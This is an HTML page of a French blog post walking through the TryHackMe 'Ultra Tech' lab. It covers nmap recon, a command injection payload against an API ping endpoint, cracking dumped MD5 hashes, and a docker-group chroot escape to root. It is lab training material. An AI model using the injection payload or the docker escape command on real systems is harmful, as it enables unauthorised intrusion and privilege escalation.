@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>
+        🇫🇷 TryHackMe - Ultra Tech ::
+        infosec blog
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta
+  name="description"
+  content="ultratech.thm # Difficulty: Medium OS: Linux Description: The basics of Penetration Testing, Enumeration, Privilege Escalation and WebApp testing Link https://tryhackme.com/room/ultratech1 Note # La partie &amp;ldquo;exploitation d&amp;rsquo;api&amp;rdquo; m&amp;rsquo;a bien plu même si le reste de la room est pas dingue dingue
+Je pense que c&amp;rsquo;est une des dernières room medium en web que j&amp;rsquo;vais faire, les prochaines seront Hard ou Insane
+Recon # nmap -sC -sV -p- ultratech.thm
+Starting Nmap 7."
+/>
+<meta
+  name="keywords"
+  content="rami malek"
+/>
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="/thm-writeups/thm-ultratech/" />
+
+
+<meta name="description" content="un blog sur lequel vous pourrez retrouver des writeups et des posts explicatifs en français et en anglais">
+
+
+
+
+<link rel="stylesheet" href="/css/style.css" />
+
+<link rel="stylesheet" href="/style.css" />
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png" />
+<link rel="shortcut icon" href="/img/favicon.png" />
+
+
+<link href="/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="🇫🇷 TryHackMe - Ultra Tech"/>
+<meta name="twitter:description" content="Writeup pour la room &#34;Ultra Tech&#34;, une room medium sous linux"/>
+
+
+
+<meta property="og:title" content="🇫🇷 TryHackMe - Ultra Tech" />
+<meta property="og:description" content="Writeup pour la room &#34;Ultra Tech&#34;, une room medium sous linux" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/thm-writeups/thm-ultratech/" /><meta property="article:section" content="thm-writeups" />
+<meta property="article:published_time" content="2022-12-30T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-12-30T00:00:00+00:00" /><meta property="og:site_name" content="infosec blog" />
+
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a
+  href="/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >c0nfl1c7</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/archive">Archive</a></li>
+        
+      
+      
+        <ul class="menu__sub-inner">
+          <li class="menu__sub-inner-more-trigger">
+            writeups
+            <span class="menu__sub-inner-more-trigger-icon"
+              ><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span
+            >
+          </li>
+          <ul class="menu__sub-inner-more hidden">
+            
+              
+                <li><a href="/htb-writeups/">HTB Writeups</a></li>
+              
+            
+              
+                <li><a href="/thm-writeups/">THM Writeups</a></li>
+              
+            
+          </ul>
+        </ul>
+      
+      
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/archive">Archive</a></li>
+      
+    
+      
+        <li><a href="/htb-writeups/">HTB Writeups</a></li>
+      
+    
+      
+        <li><a href="/thm-writeups/">THM Writeups</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none" />
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg
+  class="theme-toggler"
+  width="24"
+  height="24"
+  viewBox="0 0 48 48"
+  fill="none"
+  xmlns="http://www.w3.org/2000/svg"
+>
+  <path
+    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
+  />
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <article class="post">
+    <h1 class="post-title">🇫🇷 TryHackMe - Ultra Tech</h1>
+    <div class="post-meta">
+      
+        <time class="post-date">
+          30-12-2022
+        </time>
+
+        
+      
+
+      
+        <span class="post-author"
+          >— écrit par conflict</span
+        >
+
+
+      
+        <span class="post-read-time"
+          >— 3 minute(s) de lecture</span
+        >
+      
+    </div>
+
+    
+
+    
+
+    <div class="post-content">
+      
+      <h1 id="ultratechthm">
+  ultratech.thm
+  <a href="#ultratechthm" class="h-anchor" aria-hidden="true">#</a>
+</h1>
+<ul>
+<li>Difficulty: Medium</li>
+<li>OS: Linux</li>
+<li>Description: <code>The basics of Penetration Testing, Enumeration, Privilege Escalation and WebApp testing</code></li>
+<li>Link <a href="https://tryhackme.com/room/ultratech1">https://tryhackme.com/room/ultratech1</a></li>
+</ul>
+<h1 id="note">
+  Note
+  <a href="#note" class="h-anchor" aria-hidden="true">#</a>
+</h1>
+<p>La partie &ldquo;exploitation d&rsquo;api&rdquo; m&rsquo;a bien plu même si le reste de la room est pas dingue dingue</p>
+<p>Je pense que c&rsquo;est une des dernières room medium en web que j&rsquo;vais faire, les prochaines seront Hard ou Insane</p>
+<h2 id="recon">
+  Recon
+  <a href="#recon" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<p><code>nmap -sC -sV -p- ultratech.thm</code></p>
+<pre tabindex="0"><code>Starting Nmap 7.80 ( https://nmap.org ) at 2022-12-27 20:07 CET
+Nmap scan report for ultratech.thm (10.10.121.27)
+Host is up (0.071s latency).
+Not shown: 65531 closed ports
+PORT      STATE SERVICE VERSION
+21/tcp    open  ftp     vsftpd 3.0.3
+22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
+|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
+|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
+8081/tcp  open  http    Node.js Express framework
+|_http-cors: HEAD GET POST PUT DELETE PATCH
+|_http-title: Site doesn&#39;t have a title (text/html; charset=utf-8).
+31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 393.75 seconds
+</code></pre><p>Le <strong>nmap</strong> a pris des années mais pour une fois il est intéressant. On a un <strong>ftp</strong> sur le port <strong>21</strong>, une <strong>API Express</strong> qui tourne sur le <strong>port 8081</strong>, puis un <strong>serveur http</strong> sur le port <strong>31331</strong> (pourquoi?)</p>
+<p>La page d&rsquo;accueil du site ressemble à ça:</p>
+<p><img src="https://user-images.githubusercontent.com/77807503/210016462-06634d12-951a-4ac6-adcb-5c8495c89473.png" alt="2022-12-27-222148_934x1028_scrot"></p>
+<p><strong>/robots.txt</strong> nous montre qu&rsquo;il existe un <strong>utech_sitemap.txt</strong>. En s&rsquo;y rendant, on découvre la page <strong>/partner.html</strong> (partie franchement inutile de la room).</p>
+<p>On va sur le <strong>/partner</strong> puis on ouvre devtools, et on voit ceci das le <strong>network</strong></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/210016482-8e85173c-5805-4323-8770-8019467d7600.png" alt="2022-12-27-222407_945x204_scrot"></p>
+<p>Toutes les <code>?</code> secondes, le site fait une requête vers  son <strong>port 8081</strong>: L&rsquo;<strong>Api Express</strong></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/210016506-04d51595-f13a-4abd-b2ed-fc23e5d52da9.png" alt="2022-12-27-223057_350x44_scrot"></p>
+<h2 id="foothold-command-injection-on-api">
+  Foothold (Command injection on API)
+  <a href="#foothold-command-injection-on-api" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<p>En se rendant sur <code>ultratech.thm:8081/ping</code>, le site nous retourne &ldquo;<strong>name or service not known</strong>&rdquo;</p>
+<p>A piori, l&rsquo;api éxecute localement un <strong>ping</strong> en fonction du paramètre qu&rsquo;on lui donne, ce qui expliquerait pourquoi ça n&rsquo;a pas fonctionné: le site n&rsquo;a pas <code>ultratech.thm</code> dans son <strong>/etc/hosts</strong> et donc la commande ne peut pas fonctionner</p>
+<p>Pour s&rsquo;assurer de ça, on peut remplacer le paramètre <code>ip</code> par <strong>127.0.0.1</strong> (une ip que le serveur connaît) pour voir si ça fonctionne:</p>
+<p><img src="https://user-images.githubusercontent.com/77807503/210016520-c8ea14f3-233a-4c96-ab19-30818d1decd8.png" alt="2022-12-27-223617_1891x159_scrot"></p>
+<p>Et on voit bien que la commande fonctionne. On peut donc partir sur une <strong>command injection</strong> avec un payload assez simple:</p>
+<p><code>ip=127.0.0.1;`ls` </code></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/210016543-526bcee9-1892-4a39-80da-900a8e3b9d08.png" alt="2022-12-27-224455_668x131_scrot"></p>
+<p>On voit un seul fichier: <code>utech.db.sqlite</code>. On va utiliser la commande <strong>cat</strong> pour lire son contenu</p>
+<p><img src="https://user-images.githubusercontent.com/77807503/210016554-c9308d02-4c37-47b5-8c00-7f42f2948321.png" alt="2022-12-27-224513_1268x132_scrot"></p>
+<p>On a quelque chose qui ressemble à des identifiants, on va tenter de crack les hash que ça nous a donné:</p>
+<p><code>r00t:f357a0c52799563c7c7b76c1e7543a32</code></p>
+<p><code>admin:0d0ea5111e3c1def594c1684e3b9be84</code></p>
+<p>On va tester avec <a href="https://crackstation.net">https://crackstation.net</a> et le premier hash (md5)</p>
+<p><img src="https://user-images.githubusercontent.com/77807503/210016592-1425a0a3-d70d-4be7-ade4-9d029b505db4.png" alt="2022-12-27-225254_1031x66_scrot"></p>
+<p>On a le mot de passe de <code>r00t</code>, qu&rsquo;on  va utiliser pour se ssh</p>
+<p><code>ssh r00t@ultratech.thm</code></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/210016606-af809307-4fbd-45b0-a9d3-553752867220.png" alt="2022-12-27-225416_894x825_scrot"></p>
+<h2 id="privilege-escalation-via-docker-escape">
+  Privilege escalation (via Docker Escape)
+  <a href="#privilege-escalation-via-docker-escape" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<p><code>sudo -l</code> ne nous retourne rien, on va chercher si certaines files on le SUID bit</p>
+<p><code>find / -perm -4000 2&gt;/dev/null</code></p>
+<pre tabindex="0"><code>/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/snapd/snap-confine
+/usr/lib/openssh/ssh-keysign
+/usr/bin/newuidmap
+/usr/bin/chfn
+/usr/bin/traceroute6.iputils
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/newgidmap
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/at
+/usr/bin/sudo
+/usr/bin/gpasswd
+/bin/su
+/bin/mount
+/bin/ping
+/bin/ntfs-3g
+/bin/fusermount
+/bin/umount
+/snap/core/6350/bin/mount
+/snap/core/6350/bin/ping
+/snap/core/6350/bin/ping6
+/snap/core/6350/bin/su
+/snap/core/6350/bin/umount
+/snap/core/6350/usr/bin/chfn
+/snap/core/6350/usr/bin/chsh
+/snap/core/6350/usr/bin/gpasswd
+/snap/core/6350/usr/bin/newgrp
+/snap/core/6350/usr/bin/passwd
+/snap/core/6350/usr/bin/sudo
+/snap/core/6350/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/6350/usr/lib/openssh/ssh-keysign
+/snap/core/6350/usr/lib/snapd/snap-confine
+/snap/core/6350/usr/sbin/pppd
+/snap/core/6531/bin/mount
+/snap/core/6531/bin/ping
+/snap/core/6531/bin/ping6
+/snap/core/6531/bin/su
+/snap/core/6531/bin/umount
+/snap/core/6531/usr/bin/chfn
+/snap/core/6531/usr/bin/chsh
+/snap/core/6531/usr/bin/gpasswd
+/snap/core/6531/usr/bin/newgrp
+/snap/core/6531/usr/bin/passwd
+/snap/core/6531/usr/bin/sudo
+/snap/core/6531/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/6531/usr/lib/openssh/ssh-keysign
+/snap/core/6531/usr/lib/snapd/snap-confine
+/snap/core/6531/usr/sbin/pppd
+</code></pre><p>Rien d&rsquo;intéressant sur ça, on va donc tenter de run <code>linpeas</code></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/210016630-6bb2f827-441f-44f0-940f-a87590eb657d.png" alt="2022-12-27-230610_964x187_scrot">
+<img src="https://user-images.githubusercontent.com/77807503/210016643-7f064b39-5a25-4dd5-a031-b9a6e98c7639.png" alt="2022-12-27-230648_968x209_scrot"></p>
+<p>Dès que je le lance je me rends compte que j&rsquo;ai complètement oublié de faire un <code>id</code> 🤡 et je vois que l&rsquo;utilisateur <code>r00t</code> est dans le groupe docker</p>
+<p>On peut donc utiliser la commande <code>docker image list</code> pour voir les images docker sur le serveur</p>
+<pre tabindex="0"><code>REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
+bash                latest              495d6437fc1e        3 years ago         15.8MB
+</code></pre><p>Puis on utilise cette commande pour s&rsquo;escape du docker:</p>
+<p><code>docker run -v /:/mnt --rm -it bash chroot /mnt sh</code></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/210016657-8a39b52b-0591-4a5e-ac84-db7c020c0dc8.png" alt="2022-12-27-233728_1222x98_scrot"></p>
+<p>gg !</p>
+
+    </div>
+    
+
+    
+      
+    
+  </article>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">rami malek en personne</div>
+      
+  </div>
+</footer>
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
